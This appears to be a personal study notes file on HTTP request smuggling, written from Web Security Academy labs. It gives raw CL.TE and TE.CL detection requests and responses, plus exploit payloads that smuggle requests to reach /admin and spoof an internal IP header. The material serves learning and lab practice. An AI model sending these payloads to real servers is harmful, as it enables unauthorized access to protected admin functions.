# Content
- [HTTP request smuggling Types](#http-request-smuggling-types)
  - [CL.TE](#clte)
      - [Finding CL.TE](#finding-clte)
          - [using differential responses](#using-differential-responses)
          - [using time delay](#using-time-delay)
  - [TE.CL](#tecl)
      - [Finding TE.CL](#finding-tecl)
          - [using differential responses](#using-differential-responses-1)
          - [using time delay](#using-time-delay-1)
- [Exploiting HTTP request smuggling vulnerabilities](#exploiting-http-request-smuggling-vulnerabilities)
  - [bypass front-end security controls](#bypass-front-end-security-controls)
  - [Revealing front-end request rewriting](#revealing-front-end-request-rewriting)

## HTTP request smuggling Types 
### CL.TE
the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding
#### Finding CL.TE
##### using differential responses
- request
```http
POST / HTTP/1.1
Host: 0a6500df03127c4d814e75e300a100a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Transfer-Encoding: chunked

0

G

```
- response
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```
**OR**
- request
```http
POST / HTTP/1.1
Host: 0a6500df03127c4d814e75e300a100a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Content-Length: 15


```
- response
```http
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=xoMJbTEes2ryW1PlMaosC136QVh3RPWo; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```



##### using time delay
- request
```http
POST / HTTP/1.1
Host: 0a6500df03127c4d814e75e300a100a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7
A
xxx

```
- response
```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```

### TE.CL
the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header
#### Finding TE.CL
##### using differential responses
- request
```http
POST / HTTP/1.1
Host: 0a3200cf04cedd8280132134009f00db.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

28
GPOST / HTTP/1.1
Content-Length: 15


0


```
- response
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```
**OR**
- request
```http
POST / HTTP/1.1
Host: 0a1400a9045d90718087850f0092005f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

29
GET /404 HTTP/1.1
Content-Length: 15


0


```
- response
```http
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=ZxP5vPp2QyzeBn8FJ2Xa6RzpmF1bO84D; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

##### using time delay
- request
```http
POST / HTTP/1.1
Host: 0a1400a9045d90718087850f0092005f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
- response
```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```
## Exploiting HTTP request smuggling vulnerabilities
### bypass front-end security controls
- CL.TE
```http
POST / HTTP/1.1
Host: VulnWebsite
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
- TE.CL
```http
POST / HTTP/1.1
Host: VulnWebsite
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
### Revealing front-end request rewriting
In many applications, the front-end server modifies incoming requests before sending them to the back-end server by adding additional request headers. For instance, it may:

    Terminate the TLS connection and include headers describing the protocol and ciphers used.
    Add an X-Forwarded-For header with the user's IP address.
    Determine the user's ID from their session token and include a corresponding header.
    Add sensitive information relevant for certain attacks.

In some cases, if your smuggled requests lack headers typically added by the front-end server, the back-end server may not process them as expected, causing the smuggled requests to fail in achieving their intended objectives.

You can often uncover how the front-end server alters requests by following these steps:

    Identify a POST request that reflects a request parameter's value in the application's response.
    Rearrange the parameters so that the reflected parameter is the last one in the message body.
    Send this modified request to the back-end server, immediately followed by a regular request whose modified form you aim to reveal.



- request
```http
POST / HTTP/1.1
Host: 0a3600c5040f5ca884177e2b00110060.web-security-academy.net
Cookie: session=43WZAzODZhS7tshSG8vHxiOcDdUixfgM
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Transfer-Encoding: chunked

8
search=1
0

POST / HTTP/1.1
Content-Length: 300

search=
```
- response
```http
X-SoDAPc-Ip: 41.40.121.254
Host: 0a3600c5040f5ca884177e2b00110060.web-security-academy.net
Cookie: session=43WZAzODZhS7tshSG8vHxiOcDdUixfgM
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Transfer-Encoding: chunked
```
- attack
```http
POST / HTTP/1.1
Host: 0a3600c5040f5ca884177e2b00110060.web-security-academy.net
Cookie: session=43WZAzODZhS7tshSG8vHxiOcDdUixfgM
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Transfer-Encoding: chunked

8
search=1
0

GET /admin HTTP/1.1
Content-Length: 10
X-SoDAPc-Ip: 127.0.0.1


```
